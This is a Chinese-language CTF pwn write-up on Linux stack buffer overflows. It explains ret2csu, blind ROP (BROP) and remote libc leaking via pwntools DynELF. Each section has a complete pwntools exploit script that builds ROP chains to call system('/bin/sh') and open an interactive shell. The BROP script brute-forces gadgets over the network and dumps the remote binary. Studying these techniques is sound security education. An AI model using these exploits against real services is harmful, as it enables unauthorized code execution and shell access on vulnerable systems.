---
title: 浅析 linux_stack_overflow 漏洞
categories:
  - linux_pwn
tags:
  - Null
---

栈溢出可以说是学习 `pwn` 的基础，在这里总结一下栈溢出的技巧



# 0x1 漏洞原理

原理在 [**这**](https://en.wikipedia.org/wiki/Stack_buffer_overflow)

# 0x2 漏洞利用

这里记录栈溢出比较好玩的利用技巧。

## 0x21 level-5 && ret2csu

日常 `checksec` 一下

```sh
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

开了 `NX` 栈不可执行，没开 `PIE` 。



### 程序分析

这道题比较简单，执行后就可以进行栈溢出。

![level5_1 ](/image/2019-04-03-linux_pwn_stack/level5_1 .png)

但是由于是 `64` 位的应用程序，不可以直接通过栈进行传参，直接使用 `Ropgadget` 并不能直接构建 `ROP` 链。看了一下函数，发现有 `__libc_csu_init` 这个函数。

![level5_2](/image/2019-04-03-linux_pwn_stack/level5_2.png)

#### ret2csu

在这里我们延伸的讲一下 `ret2csu` 的用法

在这里我们可以从 `000000000040061A` 构建 `rbx`、 `rbp`、 `r12`、 `r13`、 `r14`、`r15` 这几个寄存器。

利用 `retn` 从 `0x0000000000400600` 这里开始执行将  `r13`、 `r14`、`r15` 的值依次传给 `rdx`、 `rsi`、`edi`。

这里需要注意的是由于传给的是 `edi` 这个 `32` 位的寄存器，所以给 `r15` 的值必须小于等于 `0xffffffff`。

在 `0x0000000000400609` 返回后会继续执行，所以我们需要构建寄存器的时候要满足 `rbx+1 == rbp`。

然后我们又可以控制返回地址。

这就是 `ret2csu` 的利用方式。

除了 `ret2csu` 还有下面几种常见（gcc 默认编译的）的函数：

```c
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```



### 漏洞利用

既然这样我们的思路就出来了。

1. 栈溢出执行通过 `ret2csu` 泄露 `libc` 的基地址
2. 利用 `ret2csu` 将 `libc` 的基地址和 `/bin/sh` 字符串写入到内存中可写且固定（.bss/.data）的地方去。
3. 利用 `ret2csu` 执行 `system('/bin/sh')`



`poc` :

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def send_value(exp_file, payload):
    exp_file.recvuntil("World")
    exp_file.sendline(payload)


def main():
    exp_file = process("./level5")
    elf_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")

    # Use ret2csu to leak the base address of libc
    payload_1 = "a"*0x88
    payload_1 += p64(0x40061a) # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    payload_1 += p64(0x0) + p64(0x1) + p64(0x0000000000601018) + p64(0x10) + p64(0x0000000000601018) + p64(1) + p64(0x400600)
    payload_1 += p64(0x0) * 7 + p64(0x400587)

    send_value(exp_file, payload_1)
    libc_addr = u64(exp_file.recvuntil("Hello")[1:9]) - elf_file.symbols['write']
    log.info("libc_addr: {libc_addr}".format(libc_addr=hex(libc_addr)))

    system_addr = libc_addr + elf_file.symbols['system']

    # Write "/bin/sh" to memory using ret2csu
    payload_2 = "a"*0x88
    payload_2 += p64(0x40061a)  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    payload_2 += p64(0x0) + p64(0x1) + p64(0x0000000000601020) + p64(0x20) + p64(0x0000000000601FC0) + p64(0)
    payload_2 += p64(0x400600)  # mov rdx,r13; mov rsi,r14; mov di,r15d; call QWORD PTR [r12+rbx*8];
    payload_2 += p64(0x0) * 7 + p64(0x400587)
    send_value(exp_file, payload_2)
    exp_file.sendline("/bin/sh;")

    # Write system to memory using ret2csu
    payload_3 = "a"*0x88
    payload_3 += p64(0x40061a)  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    payload_3 += p64(0x0) + p64(0x1) + p64(0x0000000000601020) + p64(0x40) + p64(0x0000000000601Fe0) + p64(0)
    payload_3 += p64(0x400600)  # mov rdx,r13; mov rsi,r14; mov di,r15d; call QWORD PTR [r12+rbx*8];
    payload_3 += p64(0x0) * 7 + p64(0x400587)
    exp_file.sendline(payload_3)
    exp_file.sendline(p64(system_addr))

    # Exec system('/bin/sh;') using ret2csu
    payload_4 = "a"*0x88
    payload_4 += p64(0x40061a)  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
    payload_4 += p64(0x0) + p64(0x1) + p64(0x00601fe0) + p64(0x0) + p64(0x0) + p64(0x601fc0)
    payload_4 += p64(0x400600)  # mov rdx,r13; mov rsi,r14; mov di,r15d; call QWORD PTR [r12+rbx*8];
    payload_4 += p64(0x0) * 7 + p64(0x400587)
    exp_file.sendline(payload_4)

    print(exp_file.proc.pid)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```

由于在内存空间的不确定性，这里可能要执行多次才会有 `shell`



## 0x22 hctf2016 - brop && brop



### 程序分析

由于这道题没有源码，所以我直接总结一下 `brop` 这个利用技巧。

#### brop

[`brop`](http://www.scs.stanford.edu/brop/bittau-brop.pdf) 这个利用技巧，于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014。

这里我们直接介绍攻击条件。

##### 攻击条件

1. 程序必须存在栈溢出漏洞
2. 程序崩溃后重启后 **地址** 必须和崩溃之前相同，也就是说如果机器开启了 `ASLR` ,也只是第一次启动程序时存在效果，目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。（这里的 **地址** ,我的理解为 `.text` 段的地址（换句话说就是 `PIE` 保护失效）, 如有错误望大佬指出！）

##### 基本思路

1. 获取栈长度（暴力破解，如果存在 `cannary` 可以通过单个字节依次爆破获得 cannary）
2. 获取 `stop gadget` （使程序重复执行栈溢出漏洞点的地址，暴力获取）
3. 获取 `brop gadget` （用来控制函数调用的参数）
4. 获取 `write`、`puts`、`printf` 等输入输出函数地址（用于输出程序空间）
5. 泄露的程序空间中找到 `got` 表（泄露整个程序代码段找到 `got` 表，用于泄露 `libc` 的基地址）
6. 根据泄露的 `libc` 地址，获取 `system` 函数、`/bin/sh` 字符串、`one_gadget` 等的函数地址。
7. 根据上面获取到的信息，构建获取 `shell` 的 `payload`。

##### brop gadget

这里记录一下，获取 `brop gadget` 的方法。

首先介绍一下原理：

1. `Probe gadget` （探针，需要探测的内存空间）
2. `Stop gadget`（使程序重复执行栈溢出漏洞点的地址）
3. `Trap gadget`（使程序直接退出）

**payload_1**：Probe gadget + Stop gadget

此 payload 可以探测代码为：

1. xor r16/r32/r64, r16/r32/r64; ret;
2. ret;

**payload_2**：Probe gadget + Pop_content + Stop gadget

此 payload 可以探测代码为：

1. pop r16/r32/r64; ret;
2. pop r16/r32/r64; some code ; ret;

**payload_3**：Probe gadget + Pop_content * 6 + Stop gadget

此 payload 可以探测代码为：

1. pop r16/r32/r64; ret;
2. pop r16/r32/r64 * 6; some code ; ret;

我们可以通过判断程序是否正常重新执行就可以得到改地址是否为可用的 `brop gadget`

这里我们可以用到上一节所叙述的 `ret2csu` 中提到的函数 `__libc_csu_init` （存在连续的六个的 `pop`），我们可以尝试探测它。

##### get plt

我们在获取到 `__libc_csu_init` 后，可以构建 `pop rdi` （csu_addr + 9）。

如果 `x64` 程序没有开启 `PIE`，在 0x400000 开始的地方为固定值 `\x7felf`。

在这我记录一下关于找 `puts plt` 地址的 payload

payload：Pop_rdi_gadget + 0x400000 + Probe gadget + Stop gadget

我可以通过得到的返回值是否为 `\x7felf` 来判断是否遇到 `puts` 或者 `printf`

write 和 puts 的原理类似，这里不做过多的赘述了。

##### get got

通过上面获取到的东西，我们可以开始进行 `dump` 这个 `elf` 文件的 .`text` 段的内容了，主要的目的是泄露 `got` 表。所以我们直接通过上一小节得到的 `put_plt` 为当前代码段的最大长度进行 `dump` 。

我们将 dump 下来的文件，通过 ida 打开（通过 binary），然后在 edit->segments->rebase program 将程序的基地址改为 `0x400000` ，然后找到上面 `plt` 的偏移量，然后按 `c` 进行将数据转为汇编，这样我们就得到了当前函数的 `got` 表地址。



### 漏洞利用

在上一小节中，我们了解到了 brop 的用法，在本题中，由于没有 开启 `PIE` ，也没有发现 `cannary` ，所以这里就不赘述了，直接放出 `poc` 。

`poc` :

```python
# -*- coding: utf-8 -*-
# !/usr/bin/python env
from pwn import *


def get_stack_offset():
    for length in range(200):
        exp_file = remote("127.0.0.1", 10000)
        exp_file.recvuntil("WelCome my friend,Do you know password?\n")
        exp_file.sendline("a"*length)
        try:
            exp_file.recvuntil("No password, no game", timeout=1)
            exp_file.close()
        except Exception as e:
            exp_file.close()
            print("stack_length: {length}".format(length=length-1))
            # exp_file.interactive() we can use the recv information to check the program cannary is on or off
            return length-1


def get_stop_gadget(stack_offset):
    start_addr = 0x400000
    for length in range(0x1000):
        exp_file = remote("127.0.0.1", 10000)
        exp_file.recvuntil("WelCome my friend,Do you know password?\n")
        exp_file.sendline("a"*stack_offset + p64(start_addr+length))
        print("[*] We try to test addr: {addr}".format(addr=hex(start_addr + length)))
        try:
            exp_file.recvuntil("WelCome my friend,Do you know password?\n", timeout=1)
            exp_file.sendline("test")
            exp_file.recvuntil("No password, no game", timeout=1)
            print("[+] We find a addr: {addr}".format(addr=hex(start_addr + length)))
            exp_file.close()
            return start_addr+length
        except Exception as e:
            exp_file.close()
            print("[-] We can't use addr: {addr}".format(addr=hex(start_addr + length)))


def get_brop_gadget(stack_offset, stop_gadget):
    start_addr = 0x400000
    for nums in range(0x1000):
        exp_file = remote("127.0.0.1", 10000)
        exp_file.recvuntil("WelCome my friend,Do you know password?\n")
        exp_file.sendline("a"*stack_offset + p64(start_addr+nums) + p64(0)*6 + p64(stop_gadget))
        print("[*] We try to test addr: {addr}".format(addr=hex(start_addr+nums)))
        try:
            exp_file.recvuntil("WelCome my friend,Do you know password?\n", timeout=1)
            exp_file.close()
            # Now! we need check the address
            exp_file = remote("127.0.0.1", 10000)
            exp_file.recvuntil("WelCome my friend,Do you know password?\n")
            exp_file.sendline("a" * stack_offset + p64(start_addr+nums) + p64(0)*7)
            try:
                exp_file.recvuntil("No password, no game", timeout=1)
            except Exception as e:
                print("[+] We find a addr: {addr}".format(addr=hex(start_addr + nums)))
                return start_addr+nums

        except Exception as e:
            exp_file.close()
            print("[-] We can't use addr: {addr}".format(addr=hex(start_addr+nums)))
            # print("stack_length: {length}".format(length=length-1))


def get_puts_plt(stack_offset, stop_gadget, pop_rdi_gadget):
    start_addr = 0x400000
    for length in range(0x1000):
        exp_file = remote("127.0.0.1", 10000)
        exp_file.recvuntil("WelCome my friend,Do you know password?\n")
        exp_file.sendline("a" * stack_offset + p64(pop_rdi_gadget) + p64(0x400000) + p64(start_addr+length) + p64(stop_gadget))
        print("[*] We try to test addr: {addr}".format(addr=hex(start_addr + length)))
        try:
            recv_content = exp_file.recvuntil('\nWelCome', timeout=1).split("\nWelCome")[0]
            if "\x7fELF" in recv_content:
                print("[+] We find a addr: {addr}".format(addr=hex(start_addr + length)))
                exp_file.close()
                return start_addr + length
            exp_file.close()
        except Exception as e:
            exp_file.close()
            print("[-] We can't use addr: {addr}".format(addr=hex(start_addr + length)))


def dump_file_content(stack_offset, stop_gadget, pop_rdi_gadget, put_plt):
    start_addr = 0x400000
    file_ptr = open('./core', 'wb+', 0)
    for length in range(0x1000):
        exp_file = remote("127.0.0.1", 10000)
        exp_file.recvuntil("WelCome my friend,Do you know password?\n")
        exp_file.sendline("a" * stack_offset + p64(pop_rdi_gadget) + p64(start_addr) + p64(put_plt) + p64(stop_gadget))
        print("[*] We try to test addr: {addr}".format(addr=hex(start_addr)))
        try:
            file_content = exp_file.recvuntil('\nWelCome', timeout=1).split("\nWelCome")[0]
            if file_content == "":
                file_content = "\x00"
            file_ptr.write(file_content)
            start_addr += len(file_content)
            exp_file.close()
            if start_addr == 0x401000:
                file_ptr.close()
                return
        except Exception as e:
            exp_file.close()
            print(e)


def get_put_addr(exp_file, stack_offset, stop_gadget, pop_rdi_gadget, put_plt, put_got):
    exp_file.recvuntil("WelCome my friend,Do you know password?\n")
    exp_file.sendline("a" * stack_offset + p64(pop_rdi_gadget) + p64(put_got) + p64(put_plt) + p64(stop_gadget))
    print("[*] We try to test addr: {addr}".format(addr=hex(put_got)))
    try:
        put_addr = u64(exp_file.recvuntil('WelCome', timeout=1).split("\nWelCome")[0]+"\x00"*2)
        return put_addr
    except Exception as e:
        exp_file.close()
        print(e)


def main():
    libc_file = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    bin_sh_offset = 0x18cd57
    stack_offset = get_stack_offset()  # Blasting stack offset
    stop_gadget = get_stop_gadget(stack_offset)  # Blasting stop_gadget
    brop_gadget = get_brop_gadget(stack_offset, stop_gadget)  # Blasting brop gadget
    pop_rdi_gadget = brop_gadget + 9  # disasam("\x5f\xc3") > pop rdi;ret
    put_plt = get_puts_plt(stack_offset, stop_gadget, pop_rdi_gadget)  # Blasting put_plt
    dump_file_content(stack_offset, stop_gadget, pop_rdi_gadget, put_plt)  # dump the elf file contents (.text)
    # stop_gadget = 0x4005c0
    # brop_gadget = 0x4007ba
    # pop_rdi_gadget = brop_gadget + 9  # disasam("\x5f\xc3") > pop rdi;ret
    # put_plt = 0x400560
    put_got = 0x601018

    # leak base address of libc
    exp_file = remote("127.0.0.1", 10000)
    libc_addr = get_put_addr(exp_file, stack_offset, stop_gadget, pop_rdi_gadget, put_plt, put_got) - libc_file.symbols['puts']
    system_addr = libc_addr + libc_file.symbols['system']
    bin_sh_addr = libc_addr + bin_sh_offset
    log.info("libc_addr: {libc_addr}".format(libc_addr=hex(libc_addr)))

    # Trigger system("/bin/sh")
    payload = "a" * 72 + p64(pop_rdi_gadget) + p64(bin_sh_addr) + p64(system_addr) + p64(stop_gadget)
    exp_file.recvuntil("password?\n")
    exp_file.sendline(payload)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



## 0x23 level3 && leak the version of remote libc

这道题，只给出了 `elf` 文件并没有给出 `libc` 。

日常 `checksec` ：

```sh
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### 程序分析

`main` 函数调用了 `vulnerable_function` 。

![level3_flow_chart](/image/2019-04-03-linux_pwn_stack/level3_flow_chart.png)

`vulnerable_function` 有一个很明显的栈溢出漏洞，但是这里开启了 `NX` 没有办法写 `shellcode` 。

#### leak the version of remote libc

很多的题目为了降低难度，很多通过调用库函数 `system` 的题目我们实际上都故意留了后门或者提供了目标系统的  `libc` 版本。我们知道，不同版本的 `libc` ，函数首地址相对于文件开头的偏移和函数间的偏移不一定一致。所以如果题目不提供 `libc` ，通过泄露任意一个库函数地址计算出 `system` 函数地址的方法就不好使了。这就要求我们想办法获取目标系统的 `libc` 。

`pwntools` 提供了一个方法 `DynELF` 可以泄露 `libc` 的版本，具体的用法在 [**这**](https://pwntools.readthedocs.io/en/stable/dynelf.html) 。

### 漏洞利用

`poc` :

```python
#! /usr/bin/env python
# -*- coding:utf-8 -*-
from pwn import *


debug = 0
if debug:
    exp_file = process('./level3')
else:
    exp_file = remote("111.198.29.45", 30223)

elf_file = ELF('./level3')


def leak(leak_addr):
    _start_addr = elf_file.symbols['_start']
    write_got = elf_file.plt['write']
    exp_file.recvuntil("Input:\n")
    payload = "a" * 0x8c
    payload += p32(write_got)
    payload += p32(_start_addr)
    payload += p32(0x1)
    payload += p32(leak_addr)
    payload += p32(0x4)
    exp_file.sendline(payload)
    get_leak_addr = exp_file.recv(4)
    log.info("{addr_1}: {addr_2}".format(addr_1=hex(leak_addr), addr_2=hex(u32(get_leak_addr))))
    return get_leak_addr


def write_bin_sh(hello_addr):
    _start_addr = elf_file.symbols['_start']
    read_plt = elf_file.plt['read']
    exp_file.recvuntil("Input:\n")
    payload = "a" * 0x8c
    payload += p32(read_plt)
    payload += p32(_start_addr)
    payload += p32(0x0)
    payload += p32(hello_addr)
    payload += p32(0x100)
    exp_file.sendline(payload)
    exp_file.sendline("/bin/sh; ")


def main():
    d = DynELF(leak, elf=elf_file)
    system_addr = d.lookup("system", "libc")
    data_addr = 0x0804A01C
    write_bin_sh(data_addr)

    _start_addr = elf_file.symbols['_start']
    exp_file.recvuntil("Input:\n")
    payload = "a" * 0x8c
    payload += p32(system_addr)
    payload += p32(_start_addr)
    payload += p32(data_addr)
    exp_file.sendline(payload)
    exp_file.interactive()


if __name__ == '__main__':
    main()
```



# 未完待续。。。

未完待续。。。



# 0x3 Reference

- [https://github.com/ybslzwa/HITCON-Training](https://github.com/ybslzwa/HITCON-Training)
- [https://ctf-wiki.github.io/ctf-wiki/](https://ctf-wiki.github.io/ctf-wiki/)





